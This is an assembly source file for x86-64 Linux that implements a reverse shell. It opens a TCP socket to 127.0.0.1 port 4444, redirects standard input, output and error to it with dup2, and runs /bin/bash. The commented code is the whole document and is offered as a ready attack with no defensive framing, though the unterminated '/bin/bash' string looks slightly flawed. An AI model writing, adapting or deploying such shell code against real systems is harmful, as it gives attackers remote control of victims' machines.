.section .data
process:
    .ascii "/bin/bash"
.section .text

create_socket: /* socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3 */
    mov $2, %rdi /* AF_INET = 2 -> tcp/ip */
    mov $1, %rsi /* SOCK_STREAM = 1 */
    xor %rdx, %rdx /* third arg is 0 */
    mov $41, %rax /* Syscall 41 is socket */
    syscall
    mov %rax, %r8 /* Saving socket fd */
    ret
/*
struct sockaddr_in {
   short int            sin_family;
   unsigned short int   sin_port;
   struct in_addr       sin_addr;
   unsigned char        sin_zero[8];
};

struct in_addr {
   unsigned long s_addr;
};
*/
make_connection: /*connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16)*/
    push %rbp
    push %rsp

 /*short int + short int + long + char* =  2 + 2 + 4 + 8 = 16 * 8 = 128*/

    sub $128, %rsp

    mov %r8, %rdi /* socket from create socket in first arg */
    mov %rsp, %rsi  /* current stack pointer as struct begin */
   
    mov $16, %rdx /*struct size*/
    mov $42, %rax /* Syscall 42 = connect */
    
    

    movw $2, (%rsi) /* AF_INET = 2 -> tcp/ip */
    movw $23569, 2(%rsi) /* 4444 in network byte order */
    movl $16777343, 4(%rsi) /* 127.0.0.1 in network byte order */
    movq $0, 8(%rsp) 
    
    syscall

    add $128, %rsp
    pop %rsp
    pop %rbp
    ret

reorder_fd: /* Link all standard fd to the socket */
    /*dup2(scktd,0); STDIN
    dup2(scktd,1); STDOUT
    dup2(scktd,2); STDERR*/


    mov $33, %rax  /* 33 is dup2 syscall number*/
    mov %r8, %rdi
    mov $0, %rsi
    syscall
    mov $33, %rax
    mov %r8, %rdi
    mov $1, %rsi
    syscall
    mov $33, %rax
    mov %r8, %rdi
    mov $2, %rsi
    syscall
    ret

create_process: /*execve(“/bin/bash”, 0, 0)*/ 
    mov $59, %rax /*execve is syscall 59*/
    lea process(%rip), %rdi
    mov $0, %rsi
    mov $0, %rdx
    syscall
    ret

.global main
    .type main, @function
main:
    call create_socket
    call make_connection
    call reorder_fd
    call create_process
    xor %rax,%rax /* return 0 */
